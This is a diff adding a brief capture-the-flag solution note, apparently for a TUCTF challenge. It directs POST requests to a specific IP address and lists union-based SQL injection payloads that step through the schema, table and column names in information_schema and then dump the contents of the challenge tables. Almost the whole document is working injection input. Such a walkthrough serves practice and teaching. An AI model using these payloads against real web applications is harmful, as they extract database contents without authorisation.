@@ -1,0 +1,15 @@
+send http post to
+http://104.199.151.39/postQuery.php
+with below data
+{name: xx, submit:1}
+and we will inject sql command to parameter 'name'
+from below line by line
+
+x' or '1'='1' order by 2# cd0f3d6af8c3f0199d04010d6a2ba78f
+x' union select 1,2# b6a11267955cf970dbd5ad7feda41080
+xx' union select 1,group_concat(schema_name) from information_schema.schemata# ce1f77e1ab5d6ce35a34452a9b843b19
+xx' union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x7475637466# ae2ae9e8bb233e86138d8655c2391536
+xx' union select 1,group_concat(column_name) from information_schema.columns where table_name=0x74756374665f696e666f# 1263a0a4e1de271da33f05f379a66b2d
+xx' union select 1,group_concat(column_name) from information_schema.columns where table_name=0x74756374665f6a756e6b# 37b8903ba2fb621c2f98ddd71ff82508
+xx' union select 1,group_concat(item,0x3a,owner) from tuctf.tuctf_junk# 6ea9b8de12dcd50b2724cc6f136e2c85
+xx' union select 1,group_concat(item,0x3a,value) from tuctf.tuctf_info# baf2dfb29e0e4e44d754ca4abd461474
